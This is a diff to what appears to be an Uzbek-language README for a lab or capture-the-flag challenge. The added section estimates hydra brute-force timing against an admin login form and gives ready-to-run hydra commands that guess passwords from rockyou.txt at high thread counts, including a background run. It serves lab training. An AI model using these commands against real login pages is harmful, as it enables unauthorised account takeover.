@@ -45,7 +45,55 @@ hydra -I -l admin -P /usr/share/wordlists/rockyou.txt -s 9004 -f -t 8 \
 
 ---
 
+## ⏱️ Qancha vaqt ketadi? (hydra tezligi)
+
+`rockyou.txt` ichida **14,344,399** parol bor. Ya'ni vaqt = **parolning ro'yxatdagi
+o'rni ÷ hydra tezligi**. Tezlikni hydra o'zi ko'rsatadi — `[STATUS] ... tries/min`
+qatoriga qarang (yoki `-o` bilan faylga yozib, `grep STATUS` qiling).
+
+Hydra `http-post-form` odatda LAN'da **~150–600 urinish/sekund** (ya'ni ~9,000–36,000/daqiqa)
+beradi — bu server javob tezligiga bog'liq. Taxminiy jadval (`-t 8`, ~300/s):
+
+| Parolning o'rni | Taxminiy vaqt |
+|-----------------|----------------|
+| TOP 100 | ~0.3 sekund |
+| TOP 1,000 | ~3 sekund |
+| TOP 10,000 | ~30 sekund |
+| TOP 100,000 | ~5 daqiqa |
+| 1,000,000 | ~1 soat |
+| Oxiri (14.3M) | ~13 soat |
+
+Challenge "parol **oddiy wordlist ichida**" deydi — odatda bu **TOP bir necha ming**
+bo'ladi, ya'ni real holatda **sekundlar–daqiqalar**. Lekin kafolat yo'q.
+
+### Tezlashtirish (muhim)
+1. **`-V` ni OLIB TASHLANG.** `-V` har bir urinishni chop etadi va hydra'ni
+   **10–50× sekinlashtiradi**. Tezlik uchun `-V`siz yurgizing.
+2. Oqimlarni oshiring: `-t 32` (yoki `-t 64`). Labda rate-limit yo'q, xavfsiz.
+3. **Avval kichik ro'yxatdan** boshlang (tez natija beradi):
+   ```bash
+   head -5000 /usr/share/wordlists/rockyou.txt > top5k.txt
+   hydra -I -l admin -P top5k.txt -s 9004 -t 32 -f \
+         10.15.1.54 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
+   ```
+   Topilmasa, to'liq `rockyou.txt` ga o'ting (fon rejimida):
+   ```bash
+   nohup hydra -I -l admin -P /usr/share/wordlists/rockyou.txt -s 9004 -t 32 -f \
+         -o hydra_result.txt 10.15.1.54 \
+         http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid" > hydra.log 2>&1 &
+   # jarayonni kuzatish:
+   tail -f hydra.log                       # [STATUS] ... tries/min
+   cat hydra_result.txt                    # topilganda parol shu yerda
+   ```
+
+### Topilganini qanday bilaman
+Hydra topganda yashil qatorda `password: XXXXX` chiqadi (va `-o` fayliga yoziladi),
+so'ng `-f` tufayli **to'xtaydi**. `[STATUS]` qatori to'xtasa — ish tugagan.
+
+---
+
 ## Papka tarkibi
+
 
 | Fayl | Vazifasi |
 |------|----------|
